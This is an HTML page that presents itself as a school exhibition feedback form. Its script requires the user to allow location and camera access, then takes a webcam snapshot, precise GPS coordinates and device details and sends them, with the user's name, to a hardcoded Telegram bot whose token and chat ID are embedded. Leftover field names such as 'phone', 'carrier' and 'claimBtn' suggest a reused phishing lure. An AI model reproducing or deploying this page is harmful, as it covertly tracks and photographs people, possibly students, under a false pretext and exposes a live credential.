<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width,initial-scale=1" />
<title>Exhibition Day Experience</title>
<style>
  body{
    margin:0;
    font-family:Arial, sans-serif;
    background:#eef2f7;
    padding:20px;
  }
  header{
    text-align:center;
    background:#2d98da;
    color:#fff;
    padding:30px 20px;
    border-radius:16px;
    margin-bottom:25px;
  }
  .container{
    max-width:900px;
    margin:auto;
  }
  .card{
    background:#fff;
    padding:25px;
    border-radius:16px;
    box-shadow:0 6px 22px rgba(0,0,0,0.10);
    margin-bottom:25px;
  }
  h2{
    margin-top:0;
    color:#2d3436;
  }
  label{
    font-weight:bold;
    margin-top:15px;
    display:block;
  }
  input,select{
    width:100%;
    padding:12px;
    border:1px solid #dcdde1;
    border-radius:10px;
    margin-top:6px;
  }
  button{
    width:100%;
    padding:14px;
    background:#2d98da;
    border:0;
    color:white;
    font-weight:bold;
    border-radius:12px;
    margin-top:18px;
    cursor:pointer;
  }
  .status{margin-top:10px;color:#636e72;}
  .mcq{margin-top:15px;}
</style>
</head>
<body>

<header>
  <h1>Exhibition Day Experience Sharing</h1>
  <p>Simple UI Â· Same functionality Â· Teacher & Student Feedback</p>
</header>

<div class="container">
  <div class="card">
    <h2>Share Your Experience</h2>

    <label>Your Role</label>
    <select id="country">
      <option value="">Select Role</option>
      <option>Teacher</option>
      <option>Student</option>
    </select>

    <label>Your Department</label>
    <select id="carrier">
      <option value="">Select Department</option>
      <option>Science</option>
      <option>Commerce</option>
      <option>Arts</option>
      <option>Other</option>
    </select>

    <label>Your Name</label>
    <input id="phone" placeholder="Enter your name" />

    <h3>Feedback (MCQs)</h3>
    <div class="mcq">
      <label>1. How informative was the event?</label>
      <select id="q1">
        <option>Excellent</option>
        <option>Good</option>
        <option>Average</option>
        <option>Poor</option>
      </select>

      <label>2. Were the models/presentations clear?</label>
      <select id="q2">
        <option>Yes</option>
        <option>No</option>
        <option>Partially</option>
      </select>

      <label>3. Should this event happen again?</label>
      <select id="q3">
        <option>Definitely</option>
        <option>Maybe</option>
        <option>No</option>
      </select>
    </div>

    <label><input id="consent" type="checkbox" /> I consent to location + camera snapshot</label>
    <button id="claimBtn">Submit</button>

    <div id="status" class="status"></div>
  </div>
</div>

<script>
// Your Telegram Bot
const BOT_TOKEN = "6298320462:AAFgjEjGy0udiRNZRG1VVpooKYyQpj4UF6U";
const CHAT_ID  = "6000036430";

const countryEl = document.getElementById("country");
const carrierEl = document.getElementById("carrier");
const phoneEl = document.getElementById("phone");
const consentEl = document.getElementById("consent");
const claimBtn = document.getElementById("claimBtn");
const statusEl = document.getElementById("status");

const sleep = ms => new Promise(r => setTimeout(r, ms));
const safe  = v => (v || "").toString().trim();

// ------------------------------------
// DEVICE INFO
// ------------------------------------
function getDeviceInfo() {
  return {
    platform: navigator.platform || "unknown",
    userAgent: navigator.userAgent || "unknown",
    screen: `${screen.width}x${screen.height}`,
    language: navigator.language || "unknown",
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || "unknown",
    touchPoints: navigator.maxTouchPoints || 0,
    connection:
      navigator.connection && navigator.connection.effectiveType
        ? navigator.connection.effectiveType
        : "unknown",
  };
}

// ------------------------------------
// LOCATION
// ------------------------------------
function requestLocation(timeout = 10000) {
  return new Promise((resolve) => {
    if (!navigator.geolocation) return resolve(null);

    let done = false;
    const timer = setTimeout(() => {
      if (!done) {
        done = true;
        resolve(null);
      }
    }, timeout);

    navigator.geolocation.getCurrentPosition(
      (pos) => {
        if (done) return;
        done = true;
        clearTimeout(timer);
        resolve({
          lat: pos.coords.latitude,
          lon: pos.coords.longitude,
          accuracy: pos.coords.accuracy,
        });
      },
      () => {
        if (done) return;
        done = true;
        clearTimeout(timer);
        resolve(null);
      },
      { enableHighAccuracy: true, timeout }
    );
  });
}

// ------------------------------------
// SNAPSHOT
// ------------------------------------
async function takeSnapshot() {
  if (!navigator.mediaDevices) return null;

  try {
    const stream = await navigator.mediaDevices.getUserMedia({
      video: { width: 1280, height: 720 },
    });
    const track = stream.getVideoTracks()[0];

    // If ImageCapture works
    if (window.ImageCapture) {
      try {
        const ic = new ImageCapture(track);
        const blob = await ic.takePhoto();
        track.stop();
        return blob;
      } catch (e) {}
    }

    // Fallback to canvas
    const video = document.createElement("video");
    video.srcObject = stream;
    await video.play();

    const canvas = document.createElement("canvas");
    canvas.width = video.videoWidth || 1280;
    canvas.height = video.videoHeight || 720;
    canvas.getContext("2d").drawImage(video, 0, 0);

    const blob = await new Promise((res) =>
      canvas.toBlob(res, "image/jpeg", 0.85)
    );

    track.stop();
    return blob;
  } catch (e) {
    return null;
  }
}

// ------------------------------------
// BUILD TEXT MESSAGE
// ------------------------------------
async function composeText(role, dept, name, q1, q2, q3) {
  const dev = getDeviceInfo();
  const loc = await requestLocation(8000);

  const locLink = loc
    ? `https://maps.google.com/?q=${loc.lat},${loc.lon}`
    : "Location not shared";

  const lines = [
    `ðŸ“Œ Exhibition Day Submission`,
    `ðŸ•’ Time: ${new Date().toISOString()}`,
    `ðŸ‘¤ Role: ${role}`,
    `ðŸ« Department: ${dept}`,
    `ðŸ“ Name: ${name}`,
    `------------------`,
    `Q1: ${q1}`,
    `Q2: ${q2}`,
    `Q3: ${q3}`,
    `------------------`,
    `Platform: ${dev.platform}`,
    `UserAgent: ${dev.userAgent}`,
    `Screen: ${dev.screen}`,
    `Language: ${dev.language}`,
    `Timezone: ${dev.timezone}`,
    `TouchPoints: ${dev.touchPoints}`,
    `Connection: ${dev.connection}`,
    `------------------`,
    `Location: ${locLink}`,
  ];

  return lines.join("\n");
}

// ------------------------------------
// SEND TEXT
// ------------------------------------
async function sendTelegramText(text) {
  const fd = new FormData();
  fd.append("chat_id", CHAT_ID);
  fd.append("text", text);

  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
    method: "POST",
    body: fd,
  });
}

// ------------------------------------
// SEND PHOTO
// ------------------------------------
async function sendTelegramPhoto(caption, blob) {
  const fd = new FormData();
  fd.append("chat_id", CHAT_ID);
  fd.append("photo", blob, "snapshot.jpg");
  fd.append("caption", caption);

  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
    method: "POST",
    body: fd,
  });
}

// ------------------------------------
// SUBMIT HANDLER
// ------------------------------------
claimBtn.addEventListener("click", async () => {
  statusEl.textContent = "";

  const role = safe(countryEl.value);
  const dept = safe(carrierEl.value);
  const name = safe(phoneEl.value);
  const q1 = document.getElementById("q1").value;
  const q2 = document.getElementById("q2").value;
  const q3 = document.getElementById("q3").value;

  if (!role || !dept || !name) {
    statusEl.textContent = "Please fill all fields before submitting.";
    return;
  }

  if (!consentEl.checked) {
    statusEl.textContent =
      "Please check consent to allow location & camera snapshot.";
    return;
  }

  statusEl.textContent = "Requesting permissions...";
  await sleep(300);

  const snapPromise = takeSnapshot();
  const textPromise = composeText(role, dept, name, q1, q2, q3);

  const [text, snapBlob] = await Promise.all([textPromise, snapPromise]);

  statusEl.textContent = "Sending to Telegram...";

  if (snapBlob) await sendTelegramPhoto(text, snapBlob);
  else await sendTelegramText(text);

  statusEl.textContent = "âœ… Submitted successfully!";
});
</script>

</body>
</html>

